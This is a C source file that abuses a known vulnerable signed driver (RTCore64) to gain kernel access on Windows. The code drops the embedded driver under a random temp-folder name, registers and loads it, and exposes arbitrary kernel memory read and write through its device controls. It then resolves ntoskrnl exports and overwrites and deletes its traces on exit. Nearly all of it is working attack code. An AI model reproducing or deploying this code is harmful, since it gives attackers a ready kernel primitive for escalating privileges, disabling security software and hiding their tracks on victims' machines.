#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include "ntdll.h"
#include <stdint.h>

#include <stdio.h>

#include "util.h"

#define DRIVER_NAME_MAX			16

static uint8_t driverBin[] = 
#include "rtcore64.h"
;

typedef struct _RTCORE64_REQUEST {
	ULONG_PTR Unknown0;
	ULONG_PTR Address;
	ULONG_PTR Unknown1;
	ULONG Size;
	ULONG Value;
	ULONG_PTR Unknown2;
	ULONG_PTR Unknown3;
} RTCORE64_REQUEST, * PRTCORE64_REQUEST;

static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;

static struct {
	wchar_t		serviceReg[MAX_PATH];
	wchar_t		driverReg[MAX_PATH];
	UNICODE_STRING	driverStr;
	wchar_t		path[MAX_PATH];
	HANDLE		device;
} state;

static struct {
	struct {
		uint64_t ntoskrnl;
	} module;
	struct {
		uint64_t allocpool;
	} fun;
} export;

void driver_open() {
	wchar_t name[DRIVER_NAME_MAX], driverPath[MAX_PATH];
	uint32_t i, n;
	BOOLEAN enabled;
	HKEY key;
	HANDLE hFile;
	DWORD type = SERVICE_TYPE_KERNEL;

	n = rand_range(5, DRIVER_NAME_MAX - 1);
	for (i = 0; i < n; ++i) {
		name[i] = rand_range('A', 'Z');
	}
	name[n] = 0;

	lstrcpyW(state.serviceReg, L"SYSTEM\\CurrentControlSet\\Services\\");
	lstrcatW(state.serviceReg, name);

	lstrcpyW(state.driverReg, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
	lstrcatW(state.driverReg, name);

	RtlInitUnicodeString(&state.driverStr, state.driverReg);

	GetTempPathW(MAX_PATH, state.path);
	lstrcatW(state.path, name);

	lstrcpyW(driverPath, L"\\??\\");
	lstrcatW(driverPath, state.path);

	printf("%ls\n", name);
	printf("%ls\n", state.serviceReg);
	printf("%ls\n", state.driverReg);
	printf("%ls\n", state.path);
	printf("%ls\n", driverPath);

	if (!NT_SUCCESS(RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &enabled))){
		//im not admin
		ExitProcess(0);
		return;
	}

	hFile = CreateFileW(state.path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, driverBin, sizeof(driverBin), NULL, NULL);
	FlushFileBuffers(hFile);
	CloseHandle(hFile);

	RegCreateKeyW(HKEY_LOCAL_MACHINE, state.serviceReg, &key);
	RegSetKeyValueW(key, NULL, L"ImagePath", REG_EXPAND_SZ, driverPath, (lstrlenW(driverPath) + 1)*sizeof(wchar_t));
	RegSetKeyValueW(key, NULL, L"Type", REG_DWORD, &type, sizeof(DWORD));
	RegCloseKey(key);

	if (!NT_SUCCESS(NtLoadDriver(&state.driverStr))) {
		ExitProcess(0);
		return;
	}

	state.device = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	printf("%p\n", state.device);
}

void driver_close() {
	HKEY key;
	SIZE_T i;
	HANDLE hDriver;
	HANDLE hFile;
	BYTE k;

	CloseHandle(state.device);

	NtUnloadDriver(&state.driverStr);
	RegDeleteKeyW(HKEY_LOCAL_MACHINE, state.serviceReg);

	hFile = CreateFileW(state.path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
	for (i = 0; i < sizeof(driverBin); ++i) {
		k = (BYTE)(rand_next() & 0xFF);
		WriteFile(hFile, &k, 1, NULL, NULL);
	}
	FlushFileBuffers(hFile);

	CloseHandle(hFile);
	_wremove(state.path);
}

static DWORD driver_ReadMemoryPrimitive(DWORD Size, PBYTE Address) {
	DWORD BytesReturned;
	RTCORE64_REQUEST req;

	RtlSecureZeroMemory(&req, sizeof(req));
	req.Address = (ULONG_PTR)Address;
	req.Size = Size;
	
	
	DeviceIoControl(state.device,
	                RTCORE64_MEMORY_READ_CODE,
	                &req,
	                sizeof(req),
	                &req,
	                sizeof(req),
	                &BytesReturned,
	                NULL);
	
	return req.Value;
}

static void driver_WriteMemoryPrimitive(DWORD Size, PBYTE Address, DWORD Value) {
	DWORD BytesReturned;
	RTCORE64_REQUEST req;

	RtlSecureZeroMemory(&req, sizeof(req));
	req.Address = (ULONG_PTR)Address;
	req.Size = Size;
	req.Value = Value;
	
	
	DeviceIoControl(state.device,
	                RTCORE64_MEMORY_WRITE_CODE,
	                &req,
	                sizeof(req),
	                &req,
	                sizeof(req),
	                &BytesReturned,
	                NULL);
}

uint16_t driver_read16(PBYTE addr) {
	return driver_ReadMemoryPrimitive(2, addr) & 0xFFFF;
}

uint32_t driver_read32(PBYTE addr) {
	return driver_ReadMemoryPrimitive(4, addr);
}

uint64_t driver_read64(PBYTE addr) {
	return ((uint64_t)driver_read32(addr + 4)) << 32 | driver_read32(addr);
}

void driver_write32(PBYTE addr, uint32_t val) {
	driver_WriteMemoryPrimitive(4, addr, val);
}

void driver_write64(PBYTE addr, uint64_t val) {
	driver_write32(addr, val & 0xFFFFFFFF);
	driver_write32(addr + 4, val >> 32);
}

void driver_read(PVOID addr, PBYTE buf, SIZE_T bufSize) {
	SIZE_T i;
	if (bufSize % 4 != 0 && bufSize % 2 != 0) {
		printf("READ: %u - %u\n", bufSize % 2, bufSize);
		driver_close();
		ExitProcess(0);
	}

	if (bufSize % 4 == 0) {
		for (i = 0; i < (bufSize / 4); ++i) {
			((uint32_t*)buf)[i] = driver_read32((PBYTE)&((uint32_t*)addr)[i]);
		}
	} else if (bufSize % 2 == 0) {
		for (i = 0; i < (bufSize / 2); ++i) {
			((uint16_t*)buf)[i] = driver_read16((PBYTE)&((uint16_t*)addr)[i]);
		}
	}
}

void driver_write(PVOID addr, PBYTE buf, SIZE_T bufSize) {
	SIZE_T i;
	if (bufSize % 4 != 0) {
		printf("WRITE: %u\n", bufSize % 4);
		driver_close();
		ExitProcess(0);
	}

	for (i = 0; i < (bufSize / 4); ++i) {
		driver_write32((PBYTE)&((uint32_t*)addr)[i], ((uint32_t*)buf)[i]);
	}
}

uint64_t driver_getKernelModule(char *module) {
	PRTL_PROCESS_MODULES buf = NULL;
	ULONG bufSize = 0, i;
	uint64_t result = 0;
	
	while (NtQuerySystemInformation(SystemModuleInformation, buf, bufSize, &bufSize) == STATUS_INFO_LENGTH_MISMATCH) {
		if (buf) {
			VirtualFree(buf, 0, MEM_RELEASE);
		}

		buf = VirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	}

	for (i = 0; i < buf->NumberOfModules; ++i) {
		if (!lstrcmpA(module, buf->Modules[i].FullPathName + buf->Modules[i].OffsetToFileName)) {
			result = (uint64_t)buf->Modules[i].ImageBase;
			break;
		}
	}

	VirtualFree(buf, 0, MEM_RELEASE);
	return result;
}

uint64_t driver_getKernelExport(uint64_t module, char *fun) {
	IMAGE_DOS_HEADER dosHeader;
	IMAGE_NT_HEADERS64 ntHeader;
	PIMAGE_EXPORT_DIRECTORY export;
	uint64_t result = 0, delta;
	uint32_t i, *funName, *funAddr, exportBase, exportSize;
	uint16_t *ordinal;

	driver_read((PVOID)module, (PBYTE)&dosHeader, sizeof(dosHeader));
	driver_read((PVOID)(module + dosHeader.e_lfanew), (PBYTE)&ntHeader, sizeof(ntHeader));

	printf("%x\n", ntHeader.Signature);
	exportBase = ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	exportSize = ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	export = VirtualAlloc(NULL, exportSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	driver_read((PVOID)(module + exportBase), (PBYTE)export, exportSize);

	delta = (uint64_t)export - exportBase;

	funAddr = (uint32_t*)(export->AddressOfFunctions + delta);
	funName = (uint32_t*)(export->AddressOfNames + delta);
	ordinal = (uint16_t*)(export->AddressOfNameOrdinals + delta);

	for (i = 0; i < export->NumberOfNames; ++i) {
		printf("%s\n", (char*)((uint64_t)funName[i] + delta));
		if (!lstrcmpA((char*)((uint64_t)funName[i] + delta), fun)) {
			result = module + funAddr[ordinal[i]];
			break;
		}
	}

	VirtualFree(export, 0, MEM_RELEASE);
	return result;
}

void driver_init() {
	export.module.ntoskrnl = driver_getKernelModule("ntoskrnl.exe");
	printf("%X\n", export.module.ntoskrnl);
	export.fun.allocpool = driver_getKernelExport(export.module.ntoskrnl, "ExAllocatePoolWithTag");
	printf("%X\n", export.fun.allocpool);
	//resolve exports
	//clear stuff
}
